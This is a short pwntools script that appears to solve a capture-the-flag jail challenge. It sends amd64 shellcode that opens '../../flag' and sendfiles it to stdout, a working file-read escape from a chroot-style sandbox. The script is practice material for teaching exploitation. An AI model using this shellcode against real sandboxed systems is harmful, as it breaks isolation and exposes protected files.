'''
สนำร../../../
'''

from pwn import *
context.arch = "amd64"


my_sc = asm('''
    push 0x00006761
    mov rdx, 0x6c662f2e2e2f2e2e
    push rdx
    /* call open('rsp', 'O_RDONLY', 'rdx') */
    push SYS_open /* 2 */
    pop rax
    mov rdi, rsp
    xor esi, esi /* O_RDONLY */
    syscall
    /* call sendfile(1, 'rax', 0, 0x7fffffff) */
    mov r10d, 0x7fffffff
    mov rsi, rax
    push SYS_sendfile /* 0x28 */
    pop rax
    push 1
    pop rdi
    cdq /* rdx=0 */
    syscall

''')
# display the bytes
print(disasm(my_sc))
# fd = open("ttt-raw","wb+")
# fd.write(my_sc)
# fd.close()
p = process(["/challenge/babyjail_level2", "/fsf"])
# context.terminal = ['tmux', 'splitw', '-h']  # Attempting to use multixterm
# p = gdb.debug(["/challenge/babyjail_level2", "/fsf"], gdbscript="source /opt/gef/gef.py")
p.send(my_sc)
p.interactive()